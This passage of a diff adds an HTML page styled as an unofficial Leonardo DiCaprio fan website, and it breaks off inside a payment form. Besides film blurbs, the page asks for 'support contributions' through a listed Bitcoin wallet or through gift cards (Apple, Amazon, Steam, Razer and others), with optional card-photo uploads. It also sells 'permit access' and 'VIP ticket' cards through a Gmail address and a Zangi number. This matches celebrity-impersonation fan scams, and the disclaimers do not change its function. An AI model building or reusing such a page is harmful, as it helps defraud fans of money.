@@ -1,0 +1,2993 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Explore Leonardo DiCaprio's cinematic journey, memorable performances and fan community.">
+<title>Leonardo DiCaprio | Fan Website</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Anton&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+    --bg:#f7f7f5;
+    --ink:#171717;
+    --muted:#696969;
+    --line:#e6e6e2;
+    --gold:#c49a61;
+}
+
+* {
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+}
+
+html { scroll-behavior:smooth; }
+
+body {
+    font-family:'DM Sans',sans-serif;
+    background:var(--bg);
+    color:var(--ink);
+    line-height:1.65;
+}
+
+h1,h2,h3,.logo {
+    font-family:'Anton',sans-serif;
+    font-weight:400;
+    line-height:1.1;
+}
+
+h1 { font-size:clamp(3rem,9vw,7rem); }
+
+h2 {
+    font-size:clamp(2.3rem,6vw,4rem);
+    margin-bottom:20px;
+}
+
+.container {
+    width:min(1180px,calc(100% - 40px));
+    margin:auto;
+}
+
+/* NAVIGATION */
+
+nav {
+    position:fixed;
+    inset:0 0 auto;
+    z-index:50;
+    background:rgba(247,247,245,.96);
+    backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line);
+}
+
+.nav-inner {
+    height:78px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+}
+
+.logo {
+    text-decoration:none;
+    color:var(--ink);
+    font-size:1.4rem;
+}
+
+.nav-links {
+    display:flex;
+    gap:15px;
+    list-style:none;
+}
+
+.nav-links a,.mobile-menu a {
+    color:var(--ink);
+    text-decoration:none;
+    font-size:.8rem;
+    font-weight:700;
+}
+
+.nav-links a:hover { color:var(--gold); }
+
+.hamburger {
+    display:none;
+    border:0;
+    background:none;
+    font-size:30px;
+    cursor:pointer;
+}
+
+.mobile-menu {
+    display:none;
+    padding:0 20px 20px;
+    flex-direction:column;
+    gap:15px;
+}
+
+.mobile-menu.open { display:flex; }
+
+/* BUTTONS */
+
+.button {
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    padding:14px 24px;
+    border:1px solid var(--gold);
+    background:var(--gold);
+    color:white;
+    font-weight:700;
+    cursor:pointer;
+    text-decoration:none;
+    border-radius:4px;
+}
+
+/* HERO */
+
+.hero {
+    min-height:740px;
+    margin-top:78px;
+    position:relative;
+    display:flex;
+    align-items:center;
+    background:#222;
+    overflow:hidden;
+}
+
+.hero-bg {
+    position:absolute;
+    inset:0;
+    background:
+    linear-gradient(90deg,rgba(0,0,0,.76),rgba(0,0,0,.20)),
+    url('leonardo-hero.jpg') center 30%/cover no-repeat;
+}
+
+.hero-content {
+    position:relative;
+    color:white;
+    padding:100px 0;
+    max-width:750px;
+}
+
+.eyebrow {
+    color:var(--gold);
+    font-size:.75rem;
+    letter-spacing:.2em;
+    text-transform:uppercase;
+    font-weight:700;
+    margin-bottom:18px;
+}
+
+.hero p {
+    color:#eee;
+    font-size:1.05rem;
+    margin:22px 0 30px;
+    max-width:570px;
+}
+
+.hero-actions {
+    display:flex;
+    flex-wrap:wrap;
+    gap:14px;
+    margin-top:25px;
+}
+
+.hero-actions .button {
+    min-width:190px;
+    text-align:center;
+}
+
+.hero-actions .secondary-button {
+    background:transparent;
+    border:2px solid var(--gold);
+    color:white;
+    transition:background .25s ease,color .25s ease;
+}
+
+.hero-actions .secondary-button:hover {
+    background:var(--gold);
+    color:white;
+}
+
+/* SECTIONS */
+
+section { padding:90px 0; }
+
+.section-head {
+    text-align:center;
+    max-width:720px;
+    margin:0 auto 45px;
+}
+
+.section-head p { color:var(--muted); }
+
+/* ABOUT */
+
+.intro-grid {
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:50px;
+    align-items:center;
+}
+
+.portrait {
+    min-height:480px;
+    background:url('leonardo-about.jpg') center 25%/cover no-repeat;
+}
+
+.intro-copy p {
+    color:var(--muted);
+    margin-bottom:16px;
+}
+
+.facts {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:12px;
+    margin-top:25px;
+}
+
+.fact {
+    border-top:2px solid var(--gold);
+    padding-top:12px;
+}
+
+.fact strong {
+    display:block;
+    font:2rem 'Anton';
+}
+
+.fact span {
+    color:var(--muted);
+    font-size:.8rem;
+}
+
+/* FILMS */
+
+.dark-section,.video-section {
+    background:#171717;
+    color:white;
+}
+
+.dark-section .section-head p,
+.video-section .section-head p {
+    color:#bbb;
+}
+
+.film-grid {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:20px;
+}
+
+.film-card {
+    background:#242424;
+    overflow:hidden;
+}
+
+.film-card img {
+    width:100%;
+    height:270px;
+    object-fit:cover;
+    display:block;
+}
+
+.film-info { padding:22px; }
+
+.film-info p {
+    color:#bbb;
+    font-size:.9rem;
+    margin-top:10px;
+}
+
+/* VIDEOS */
+
+.video-container {
+    max-width:950px;
+    margin:auto;
+    aspect-ratio:16/9;
+    background:#000;
+}
+
+.video-container iframe {
+    width:100%;
+    height:100%;
+    border:0;
+}
+
+/* GALLERY */
+
+.gallery-grid {
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:16px;
+}
+
+.gallery-grid img {
+    width:100%;
+    height:250px;
+    object-fit:cover;
+}
+
+/* FAN CLUB */
+
+.membership-section { background:#f0eee9; }
+
+.membership-grid {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:20px;
+}
+
+.member-card {
+    background:white;
+    border:1px solid var(--line);
+    padding:28px;
+}
+
+.member-card h3 {
+    font-size:1.8rem;
+    margin:15px 0;
+}
+
+.member-card p,
+.member-card li { color:var(--muted); }
+
+.member-card ul {
+    list-style:none;
+    margin-top:20px;
+}
+
+.member-card li { padding:7px 0; }
+
+/* CARD COLLECTION */
+
+.card-shop { background:#f7f5f0; }
+
+.card-shop-grid {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:22px;
+}
+
+.shop-card {
+    background:white;
+    border:1px solid var(--line);
+    border-radius:14px;
+    padding:30px 24px;
+    text-align:center;
+    box-shadow:0 8px 25px rgba(0,0,0,.05);
+}
+
+.shop-card-icon {
+    width:85px;
+    height:85px;
+    margin:0 auto 22px;
+    border-radius:50%;
+    background:#f0e6d6;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:2.7rem;
+}
+
+.shop-card h3 {
+    font-size:1.8rem;
+    margin-bottom:15px;
+}
+
+.shop-card p {
+    color:var(--muted);
+    font-size:.92rem;
+    margin-bottom:22px;
+}
+
+.shop-card .button { width:100%; }
+
+.purchase-form-box {
+    background:white;
+    border:1px solid var(--line);
+    border-radius:15px;
+    padding:30px;
+    max-width:750px;
+    margin:35px auto 0;
+    box-shadow:0 10px 30px rgba(0,0,0,.05);
+}
+
+.purchase-form-box h3 {
+    font-size:2rem;
+    margin-bottom:10px;
+    text-align:center;
+}
+
+.purchase-form-box > p {
+    color:var(--muted);
+    text-align:center;
+    margin-bottom:25px;
+}
+
+.purchase-form {
+    display:grid;
+    gap:17px;
+}
+
+.purchase-form label {
+    display:grid;
+    gap:7px;
+    font-weight:700;
+    font-size:.9rem;
+}
+
+.purchase-form input,
+.purchase-form select,
+.purchase-form textarea {
+    width:100%;
+    padding:14px;
+    border:1px solid #ddd;
+    border-radius:8px;
+    font:inherit;
+    background:white;
+    color:#171717;
+}
+
+.purchase-form textarea {
+    min-height:120px;
+    resize:vertical;
+}
+
+.purchase-submit {
+    width:100%;
+    padding:16px;
+    background:var(--gold);
+    color:white;
+    border:0;
+    border-radius:8px;
+    font-weight:700;
+    font-size:1rem;
+    cursor:pointer;
+}
+
+.purchase-submit:disabled,
+.submit-button:disabled {
+    opacity:.6;
+    cursor:wait;
+}
+
+.purchase-status {
+    display:none;
+    padding:15px;
+    background:#f0eee9;
+    border:1px solid var(--gold);
+    border-radius:8px;
+    margin-top:15px;
+    overflow-wrap:anywhere;
+}
+
+.unofficial-notice {
+    background:#fff8e9;
+    border:1px solid #e6d1a5;
+    color:#654c22;
+    padding:20px;
+    border-radius:10px;
+    margin:25px 0;
+}
+
+.shop-contact {
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    gap:12px;
+    margin-top:25px;
+}
+
+.shop-contact a { text-decoration:none; }
+
+/* SUPPORT */
+
+.support-section {
+    background:#111827;
+    color:white;
+}
+
+.support-section .section-head p { color:#c1c7d0; }
+
+.support-wrapper {
+    max-width:850px;
+    margin:auto;
+    padding:35px;
+    background:#18243b;
+    border:1px solid #34445f;
+    border-radius:25px;
+    box-shadow:0 15px 45px rgba(0,0,0,.25);
+}
+
+.support-section input,
+.support-section select,
+.support-section textarea {
+    width:100%;
+    padding:16px;
+    background:#283a55;
+    color:white;
+    border:1px solid #465a76;
+    border-radius:12px;
+    font:inherit;
+}
+
+.support-section input::placeholder,
+.support-section textarea::placeholder {
+    color:#aeb8c8;
+}
+
+.support-section select option {
+    background:#18243b;
+    color:white;
+}
+
+.support-section select:focus,
+.support-section input:focus,
+.support-section textarea:focus {
+    outline:2px solid var(--gold);
+    border-color:var(--gold);
+}
+
+.form-group { margin-bottom:20px; }
+
+.support-label {
+    display:block;
+    margin-bottom:9px;
+    font-weight:700;
+}
+
+.payment-methods {
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:18px;
+    margin:30px 0;
+}
+
+.payment-choice {
+    min-height:125px;
+    border:2px solid #465a76;
+    background:#263b57;
+    color:white;
+    border-radius:20px;
+    font-size:1.1rem;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.payment-choice.active {
+    background:linear-gradient(135deg,#f0d98d,#c49a36);
+    color:#171717;
+    border-color:#e9c44c;
+}
+
+.payment-panel {
+    display:none;
+    margin-top:25px;
+    padding:25px;
+    background:#203957;
+    border:1px solid #405878;
+    border-radius:22px;
+}
+
+.payment-panel.active { display:block; }
+
+.payment-panel h3 {
+    font-size:1.8rem;
+    margin-bottom:20px;
+}
+
+.payment-panel p {
+    color:#d0d8e5;
+    margin-bottom:18px;
+}
+
+.qr-wrap {
+    text-align:center;
+    margin:25px 0;
+}
+
+.qr-wrap img {
+    width:220px;
+    max-width:100%;
+    background:white;
+    padding:10px;
+    border-radius:10px;
+}
+
+.wallet-address {
+    background:#101a2c;
+    border:1px solid #465a76;
+    border-radius:10px;
+    padding:15px;
+    overflow-wrap:anywhere;
+    font-size:.9rem;
+    margin:15px 0;
+}
+
+.copy-button {
+    background:var(--gold);
+    color:#171717;
+    border:0;
+    border-radius:8px;
+    padding:12px 20px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.upload-box {
+    display:block;
+    padding:22px;
+    text-align:center;
+    border:2px dashed #8293a8;
+    border-radius:15px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.upload-box input { margin-top:12px; }
+
+.upload-preview {
+    display:none;
+    max-width:100%;
+    max-height:180px;
+    object-fit:contain;
+    margin:15px auto 0;
+    border-radius:10px;
+}
+
+.consent {
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    color:#d0d8e5;
+    font-size:.8rem;
+    margin:20px 0;
+}
+
+.consent input {
+    width:auto;
+    margin-top:5px;
+}
+
+.submit-button {
+    width:100%;
+    padding:17px;
+    background:var(--gold);
+    border:0;
+    border-radius:12px;
+    color:#171717;
+    font-weight:700;
+    font-size:1rem;
+    cursor:pointer;
+}
+
+.form-status {
+    display:none;
+    margin-top:18px;
+    padding:15px;
+    background:#183d2d;
+    border:1px solid #42815c;
+    border-radius:10px;
+    color:white;
+    overflow-wrap:anywhere;
+}
+
+.form-status.error {
+    background:#4a2222;
+    border-color:#a94b4b;
+}
+
+.privacy-note {
+    font-size:.78rem;
+    color:#c1c7d0;
+    margin-top:12px;
+}
+
+/* TOAST NOTIFICATIONS */
+
+.toast-message {
+    position:fixed;
+    top:100px;
+    left:50%;
+    transform:translate(-50%,-20px);
+    width:calc(100% - 40px);
+    max-width:450px;
+    padding:18px 22px;
+    border-radius:12px;
+    color:white;
+    background:#183d2d;
+    box-shadow:0 8px 30px rgba(0,0,0,.3);
+    z-index:9999;
+    opacity:0;
+    visibility:hidden;
+    transition:all .3s ease;
+    text-align:center;
+    font-weight:600;
+}
+
+.toast-message.show {
+    opacity:1;
+    visibility:visible;
+    transform:translate(-50%,0);
+}
+
+.toast-message.error {
+    background:#8b2929;
+}
+
+.toast-message.loading {
+    background:#263b57;
+}
+
+/* NEWSLETTER */
+
+.updates {
+    background:#eeeae3;
+    text-align:center;
+}
+
+.signup {
+    display:flex;
+    gap:10px;
+    max-width:550px;
+    margin:25px auto;
+}
+
+.signup input {
+    flex:1;
+    padding:14px;
+    border:1px solid #ddd;
+}
+
+/* CONTACT */
+
+.contact-grid {
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:20px;
+    max-width:800px;
+    margin:auto;
+}
+
+.contact-card {
+    padding:25px;
+    background:white;
+    border:1px solid var(--line);
+    text-align:center;
+    border-radius:8px;
+}
+
+.contact-card p { color:var(--muted); }
+
+.contact-card .button { margin-top:10px; }
+
+.contact-detail {
+    margin:15px 0;
+    font-weight:700;
+    overflow-wrap:anywhere;
+}
+
+/* FOOTER */
+
+footer {
+    background:#111;
+    color:white;
+    text-align:center;
+    padding:45px 20px;
+}
+
+footer p {
+    color:#aaa;
+    font-size:.8rem;
+    margin-top:12px;
+}
+
+.disclaimer {
+    max-width:850px;
+    margin:20px auto;
+}
+
+/* RESPONSIVE */
+
+@media(max-width:850px) {
+    .nav-links { display:none; }
+    .hamburger { display:block; }
+    .intro-grid { grid-template-columns:1fr; }
+
+    .film-grid,
+    .membership-grid,
+    .card-shop-grid {
+        grid-template-columns:1fr 1fr;
+    }
+
+    .gallery-grid { grid-template-columns:1fr 1fr; }
+}
+
+@media(max-width:560px) {
+    .hero { min-height:620px; }
+
+    .hero-actions {
+        flex-direction:column;
+        align-items:stretch;
+    }
+
+    .hero-actions .button { width:100%; }
+
+    .film-grid,
+    .membership-grid,
+    .contact-grid,
+    .card-shop-grid {
+        grid-template-columns:1fr;
+    }
+
+    .gallery-grid img { height:180px; }
+
+    .support-wrapper,
+    .purchase-form-box {
+        padding:20px;
+    }
+
+    .payment-methods { gap:10px; }
+
+    .payment-choice {
+        min-height:105px;
+        font-size:.95rem;
+    }
+
+    section { padding:65px 0; }
+
+    .signup { flex-direction:column; }
+
+    .portrait { min-height:330px; }
+}
+</style>
+</head>
+
+<body>
+
+<!-- NAVIGATION -->
+
+<nav>
+<div class="container nav-inner">
+
+<a href="#home" class="logo">LEONARDO DICAPRIO</a>
+
+<ul class="nav-links">
+<li><a href="#about">ABOUT</a></li>
+<li><a href="#films">FILMS</a></li>
+<li><a href="#videos">VIDEOS</a></li>
+<li><a href="#gallery">GALLERY</a></li>
+<li><a href="#membership">FAN CLUB</a></li>
+<li><a href="#cards">CARDS</a></li>
+<li><a href="#support">SUPPORT</a></li>
+</ul>
+
+<button class="hamburger" id="hamburger"
+aria-label="Open navigation"
+aria-expanded="false">☰</button>
+
+</div>
+
+<div class="mobile-menu" id="mobileMenu">
+<a href="#about">ABOUT</a>
+<a href="#films">FILMS</a>
+<a href="#videos">VIDEOS</a>
+<a href="#gallery">GALLERY</a>
+<a href="#membership">FAN CLUB</a>
+<a href="#cards">CARDS</a>
+<a href="#support">SUPPORT</a>
+<a href="#contact">CONTACT</a>
+</div>
+</nav>
+
+
+<!-- HERO -->
+
+<section class="hero" id="home">
+
+<div class="hero-bg"></div>
+
+<div class="container hero-content">
+
+<div class="eyebrow">Cinema • Career • Community</div>
+
+<h1>THE ART OF<br>STORYTELLING</h1>
+
+<p>
+Welcome to a space dedicated to exploring the
+cinematic journey, memorable performances and
+creative achievements of Leonardo DiCaprio.
+
+Discover celebrated films, revisit iconic moments
+and connect with fellow film enthusiasts.
+</p>
+
+<div class="hero-actions">
+<a href="#films" class="button">EXPLORE THE FILMS</a>
+<a href="#support" class="button secondary-button">SUPPORT</a>
+<a href="#contact" class="button secondary-button">REACH OUT</a>
+</div>
+
+</div>
+</section>
+
+
+<!-- ABOUT -->
+
+<section id="about">
+<div class="container intro-grid">
+
+<div class="portrait"></div>
+
+<div class="intro-copy">
+
+<div class="eyebrow">The journey behind the performances</div>
+
+<h2>A CAREER THAT<br>INSPIRES</h2>
+
+<p>
+Leonardo DiCaprio is an internationally recognized
+actor and film producer whose career spans
+decades of memorable performances.
+</p>
+
+<p>
+From powerful dramatic roles to ambitious
+cinematic productions, his work has reached
+audiences around the world.
+</p>
+
+<p>
+Beyond acting, he is also widely known for his
+environmental advocacy and commitment to
+raising awareness of environmental issues.
+</p>
+
+<div class="facts">
+<div class="fact"><strong>30+</strong><span>Years in film</span></div>
+<div class="fact"><strong>Many</strong><span>Memorable roles</span></div>
+<div class="fact"><strong>Global</strong><span>Cinematic influence</span></div>
+</div>
+
+</div>
+</div>
+</section>
+
+
+<!-- FILMS -->
+
+<section class="dark-section" id="films">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">A remarkable filmography</div>
+<h2>SELECTED FILMS</h2>
+<p>Explore selected productions and performances.</p>
+</div>
+
+<div class="film-grid">
+
+<article class="film-card">
+<img src="titanic.jpg" alt="Titanic">
+<div class="film-info">
+<h3>TITANIC</h3>
+<p>A landmark romantic drama that became a global cinematic phenomenon.</p>
+</div>
+</article>
+
+<article class="film-card">
+<img src="inception.jpg" alt="Inception">
+<div class="film-info">
+<h3>INCEPTION</h3>
+<p>A science-fiction thriller exploring dreams, memory and reality.</p>
+</div>
+</article>
+
+<article class="film-card">
+<img src="revenant.jpg" alt="The Revenant">
+<div class="film-info">
+<h3>THE REVENANT</h3>
+<p>An intense frontier survival story featuring an acclaimed performance.</p>
+</div>
+</article>
+
+</div>
+</div>
+</section>
+
+
+<!-- VIDEOS -->
+
+<section class="video-section" id="videos">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">Watch and discover</div>
+<h2>VIDEO HIGHLIGHTS</h2>
+<p>Explore memorable moments from Leonardo DiCaprio's cinematic career.</p>
+</div>
+
+<div class="video-container">
+<iframe
+src="https://www.youtube.com/embed/usqUrdA_R3I"
+title="Leonardo DiCaprio video"
+allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+allowfullscreen
+loading="lazy">
+</iframe>
+</div>
+
+</div>
+</section>
+
+
+<!-- GALLERY -->
+
+<section id="gallery">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">Memorable moments</div>
+<h2>PHOTO GALLERY</h2>
+<p>Explore photographs, film appearances and public moments.</p>
+</div>
+
+<div class="gallery-grid">
+<img src="leonardo-gallery-1.jpg" alt="Leonardo DiCaprio">
+<img src="leonardo-gallery-2.jpg" alt="Leonardo DiCaprio">
+<img src="gallery-3.jpg" alt="Gallery photograph">
+<img src="gallery-4.jpg" alt="Gallery photograph">
+</div>
+
+</div>
+</section>
+
+
+<!-- FAN CLUB -->
+
+<section class="membership-section" id="membership">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">Connect through cinema</div>
+<h2>FAN CLUB OPTIONS</h2>
+<p>Discover community options for film enthusiasts.</p>
+</div>
+
+<div class="membership-grid">
+
+<article class="member-card">
+<h3>FREE FAN</h3>
+<p>A welcoming starting point for visitors.</p>
+<ul>
+<li>✓ Public fan updates</li>
+<li>✓ Film highlights</li>
+<li>✓ Newsletter information</li>
+<li>✓ Community announcements</li>
+</ul>
+</article>
+
+<article class="member-card">
+<h3>INSIDER</h3>
+<p>A community level for film enthusiasts.</p>
+<ul>
+<li>✓ Community updates</li>
+<li>✓ Film recommendations</li>
+<li>✓ Editorial features</li>
+<li>✓ Fan discussions</li>
+</ul>
+</article>
+
+<article class="member-card">
+<h3>PREMIUM FAN</h3>
+<p>An enhanced community experience.</p>
+<ul>
+<li>✓ Extended editorial content</li>
+<li>✓ Fan polls</li>
+<li>✓ Community features</li>
+<li>✓ Special announcements</li>
+</ul>
+</article>
+
+</div>
+
+<p style="text-align:center;color:#696969;font-size:.8rem;margin-top:25px">
+Any paid membership must have clearly defined benefits,
+prices and terms before registration opens.
+</p>
+
+</div>
+</section>
+
+
+<!-- CARD COLLECTION -->
+
+<section class="card-shop" id="cards">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">Featured collection</div>
+<h2>FAN CARD COLLECTION</h2>
+<p>
+Explore the available collectible card designs.
+Contact management for product details, availability
+and pricing.
+</p>
+</div>
+
+<div class="card-shop-grid">
+
+<article class="shop-card">
+<div class="shop-card-icon">🪪</div>
+<div class="eyebrow">Collection 01</div>
+<h3>PERMIT ACCESS CARD</h3>
+<p>A collectible identification-style fan merchandise design.</p>
+<button type="button" class="button card-request-btn"
+data-card="PERMIT ACCESS CARD">REQUEST INFORMATION</button>
+</article>
+
+<article class="shop-card">
+<div class="shop-card-icon">♦️</div>
+<div class="eyebrow">Collection 02</div>
+<h3>FAN CARD</h3>
+<p>A collectible fan-card design celebrating cinema.</p>
+<button type="button" class="button card-request-btn"
+data-card="FAN CARD">REQUEST INFORMATION</button>
+</article>
+
+<article class="shop-card">
+<div class="shop-card-icon">🎫</div>
+<div class="eyebrow">Collection 03</div>
+<h3>VIP TICKET</h3>
+<p>A ticket-style collectible design for the fan collection.</p>
+<button type="button" class="button card-request-btn"
+data-card="VIP TICKET">REQUEST INFORMATION</button>
+</article>
+
+</div>
+
+<div class="unofficial-notice">
+
+<strong>PRODUCT INFORMATION:</strong>
+
+These are collectible fan merchandise designs.
+They are not official event tickets, legal permits,
+VIP admission passes or guarantees of personal access
+to Leonardo DiCaprio.
+
+This is an independently operated fan website and
+is not affiliated with or endorsed by Leonardo
+DiCaprio or his representatives.
+
+Contact website management for accurate product
+descriptions, availability, pricing, delivery
+arrangements and purchase terms before payment.
+
+</div>
+
+
+<!-- PURCHASE ENQUIRY -->
+
+<div class="purchase-form-box" id="purchaseFormBox">
+
+<div class="eyebrow" style="text-align:center">
+Product enquiries
+</div>
+
+<h3>CONTACT OUR TEAM</h3>
+
+<p>
+Choose a card and provide your contact information
+so the website management team can respond.
+</p>
+
+<form class="purchase-form" id="cardPurchaseForm">
+
+<label for="purchaseCard">
+Selected Card
+<select id="purchaseCard" required>
+<option value="">Choose a card</option>
+<option value="PERMIT ACCESS CARD">PERMIT ACCESS CARD</option>
+<option value="FAN CARD">FAN CARD ♦️</option>
+<option value="VIP TICKET">VIP TICKET 🎫</option>
+</select>
+</label>
+
+<label for="purchaseName">
+Full Name
+<input type="text" id="purchaseName"
+maxlength="100" autocomplete="name"
+placeholder="Enter your full name" required>
+</label>
+
+<label for="purchasePhone">
+Phone Number
+<input type="tel" id="purchasePhone"
+maxlength="30" autocomplete="tel"
+placeholder="Enter your phone number" required>
+</label>
+
+<label for="purchaseEmail">
+Email Address
+<input type="email" id="purchaseEmail"
+maxlength="254" autocomplete="email"
+placeholder="Enter your email address" required>
+</label>
+
+<label for="purchaseMessage">
+Note / Message
+<textarea id="purchaseMessage"
+maxlength="2000"
+placeholder="Write your enquiry or questions about the card..."
+required></textarea>
+</label>
+
+<label style="display:flex;grid-template-columns:auto 1fr;align-items:flex-start;gap:10px;font-weight:400">
+<input type="checkbox" id="purchaseConsent"
+required style="width:auto;margin-top:5px">
+<span>
+I agree that the website team may use my contact
+details to respond to this enquiry. Product
+availability, pricing and purchase terms must
+be confirmed before payment.
+</span>
+</label>
+
+<button type="submit" class="purchase-submit" id="purchaseSubmit">
+SEND PURCHASE ENQUIRY
+</button>
+
+<div class="purchase-status" id="purchaseStatus"
+role="status" aria-live="polite"></div>
+
+</form>
+
+<div class="shop-contact">
+<a href="mailto:mt0136959@gmail.com" class="button">EMAIL MANAGEMENT</a>
+<a href="https://services.zangi.com/dl/conversation/1059040366"
+target="_blank" rel="noopener noreferrer" class="button">CONTACT ON ZANGI</a>
+</div>
+
+<p style="text-align:center;font-size:.8rem;color:#696969;margin-top:20px">
+Email: mt0136959@gmail.com<br>
+Zangi Number: 1059040366
+</p>
+
+</div>
+</div>
+</section>
+
+
+<!-- SUPPORT -->
+
+<section class="support-section" id="support">
+
+<div class="container">
+
+<div class="section-head">
+<div class="eyebrow">Support information</div>
+<h2>COMMUNITY SUPPORT</h2>
+<p>
+Review the available support information.
+The intended recipient and purpose of any
+contribution should be clearly identified
+before payment.
+</p>
+</div>
+
+<div class="support-wrapper">
+
+<h3 style="text-align:center;margin-bottom:25px">
+SUPPORT CONTRIBUTION DETAILS
+</h3>
+
+<div class="form-group">
+<label class="support-label" for="customAmount">
+Contribution Amount (USD $)
+</label>
+<input type="number" id="customAmount"
+min="0.01" max="1000000" step="0.01"
+placeholder="Enter contribution amount" required>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="supporterName">Full Name</label>
+<input type="text" id="supporterName"
+maxlength="100" autocomplete="name"
+placeholder="Enter your full name" required>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="supporterEmail">Email Address</label>
+<input type="email" id="supporterEmail"
+maxlength="254" autocomplete="email"
+placeholder="Enter your email address" required>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="supporterPhone">Phone Number</label>
+<input type="tel" id="supporterPhone"
+maxlength="30" autocomplete="tel"
+placeholder="+Country code and phone number" required>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="supporterCountry">Country</label>
+<input type="search" id="supporterCountrySearch"
+placeholder="Search country...">
+<select id="supporterCountry" required>
+<option value="">Select Country</option>
+</select>
+</div>
+
+<h3 style="margin:30px 0 15px">SELECT PAYMENT METHOD</h3>
+
+<div class="payment-methods">
+
+<button class="payment-choice" id="bitcoinChoice"
+type="button" aria-pressed="false">
+₿<br><br>Crypto<br>(BTC)
+</button>
+
+<button class="payment-choice" id="giftChoice"
+type="button" aria-pressed="false">
+🎁<br><br>Gift Card
+</button>
+
+</div>
+
+
+<!-- BITCOIN -->
+
+<div class="payment-panel" id="bitcoinPanel">
+
+<h3>₿ Bitcoin Contribution</h3>
+
+<p>
+Review the wallet address and independently verify
+the intended recipient before sending funds.
+A transaction ID is not proof of receipt.
+</p>
+
+<div class="qr-wrap">
+<img src="bitcoin-donation-qr.png" alt="Bitcoin wallet QR code">
+</div>
+
+<label class="support-label">Bitcoin Wallet Address</label>
+
+<div class="wallet-address" id="walletAddress">
+bc1qaqllfesv7yhqjtet9qr39qzxqr5vzhwjyualps
+</div>
+
+<button class="copy-button" type="button" id="copyWallet">
+COPY WALLET ADDRESS
+</button>
+
+<div class="form-group" style="margin-top:25px">
+<label class="support-label" for="btcTransaction">
+Transaction ID (optional until sent)
+</label>
+<input type="text" id="btcTransaction"
+maxlength="160"
+placeholder="Enter transaction ID after payment">
+</div>
+
+</div>
+
+
+<!-- GIFT CARD -->
+
+<div class="payment-panel" id="giftPanel">
+
+<h3>🎁 Gift Card Information</h3>
+
+<p>
+Only basic card details are requested.
+Never submit a complete redemption code, PIN,
+security code or barcode.
+
+Cover sensitive information before uploading
+card images. Do not send a gift card unless
+you have independently verified the recipient
+and purpose.
+</p>
+
+<div class="form-group">
+<label class="support-label" for="cardType">Card Type</label>
+<select id="cardType">
+<option value="">Select Card Type</option>
+<option value="Physical">Physical</option>
+<option value="Digital">Digital</option>
+</select>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="cardBrand">Gift Card Brand</label>
+<select id="cardBrand">
+<option value="">Select Brand</option>
+<option value="Apple (iTunes)">Apple (iTunes)</option>
+<option value="Amazon">Amazon</option>
+<option value="Google Play">Google Play</option>
+<option value="Steam">Steam</option>
+<option value="Razer Gold PIN">Razer Gold PIN</option>
+<option value="Razer Gift Card">Razer Gift Card</option>
+<option value="Xbox">Xbox</option>
+<option value="Other">Other</option>
+</select>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftFormat">Card Format Information</label>
+<input type="text" id="giftFormat" readonly
+value="Select a card brand to see general format information">
+<p id="giftFormatNote" class="privacy-note">
+Format information is for identification only.
+No code or PIN is requested.
+</p>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftCountry">Country</label>
+<input type="search" id="giftCountrySearch"
+placeholder="Search country...">
+<select id="giftCountry">
+<option value="">Select Country</option>
+</select>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftAmount">Gift Card Balance</label>
+<input type="number" id="giftAmount"
+min="0.01" max="1000000" step="0.01"
+placeholder="Enter card balance">
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftCurrency">Currency</label>
+<input type="search" id="giftCurrencySearch"
+placeholder="Search currency...">
+<select id="giftCurrency">
+<option value="">Select Currency</option>
+</select>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftCodeLastFour">
+Non-sensitive Card Reference (optional, last four characters only)
+</label>
+<input type="text" id="giftCodeLastFour"
+maxlength="4" minlength="4"
+autocomplete="off"
+placeholder="Last four characters only"
+pattern="[A-Za-z0-9]{4}">
+<p class="privacy-note">
+Do not enter the full card number, redemption code or PIN.
+</p>
+</div>
+
+
+<div id="physicalCardUploads" style="display:none">
+
+<h3 style="margin:25px 0 15px">
+OPTIONAL REDACTED CARD PHOTOS
+</h3>
+
+<div class="form-group">
+<label class="support-label" for="giftFrontImage">
+Front of Card (redacted)
+</label>
+
+<label class="upload-box">
+📷<br>Tap to upload front image
+<input type="file" id="giftFrontImage"
+accept="image/jpeg,image/png,image/webp">
+<img id="frontPreview" class="upload-preview" alt="Front card preview">
+</label>
+</div>
+
+<div class="form-group">
+<label class="support-label" for="giftBackImage">
+Back of Card (redacted)
+</label>
+
+<label class="upload-box">
+📷<br>Tap to upload back image
+<input type="file" id="giftBackImage"
+accept="image/jpeg,image/png,image/webp">
